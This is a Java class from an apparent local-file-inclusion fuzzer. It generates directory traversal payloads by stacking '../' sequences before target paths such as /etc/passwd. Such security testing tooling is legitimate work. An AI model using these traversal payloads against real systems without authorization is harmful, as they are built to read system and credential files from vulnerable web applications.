package LfiFuzzer.payloadTypes;

import LfiFuzzer.PayloadGeneratorConfig;
import java.util.Set;
import static LfiFuzzer.TreeStructure.getTree;

/**
 * Creates a set of byte arrays containing different directory transversals
 * ranging from config tranMin to config tranMax
 * for example /etc/passwd, ../etc/passwd, ../../etc/passwd
 */
public class TransversalPayloads extends PayloadType{
    TransversalPayloads(Set<byte[]> previousPayloads, PayloadGeneratorConfig config) {
        super(previousPayloads, config);
    }

    @Override
    public Set<byte []> generatePayload(){
        for(byte[] fileToInclude: this.previousPayloads){
            newPayloads.addAll(generatePayloadsForUniqFile(fileToInclude));
        }
        return newPayloads;
    }

    private Set<byte[]> generatePayloadsForUniqFile(byte[] fileToInclude){
        Set<byte []> payloadsForFile = getTree();
        byte[] transversal = getBytes("..");
        byte[] transversalWithSlash = concatByteArrays(transversal, getBytes(this.slashDirection));

        for(int x = config.tranMin; x <= config.tranMax; x++){
            byte[] currentPayload = getBytes("");
            for(int y = 0; y <=x ; y++){
                if (y == x && checkIfFirstByteIsSlash(fileToInclude)){
                    // Stop the first payload getting an extra slash
                    currentPayload = concatByteArrays(currentPayload, transversal);
                }
                else{
                    currentPayload = concatByteArrays(currentPayload, transversalWithSlash);
                }
            }

            //stdout.print("(Tran " + x + ")");
            //printPayloadBeforeAndAfter(fileToInclude, concatByteArrays(currentPayload, fileToInclude)); //TODO REMOVE

            payloadsForFile.add(concatByteArrays(currentPayload, fileToInclude));
        }
        return payloadsForFile;
    }

    private boolean checkIfFirstByteIsSlash(byte[] fileToInclude){
        return fileToInclude[0] == getBytes("/")[0] || fileToInclude[0] == getBytes("\\")[0];
    }
}
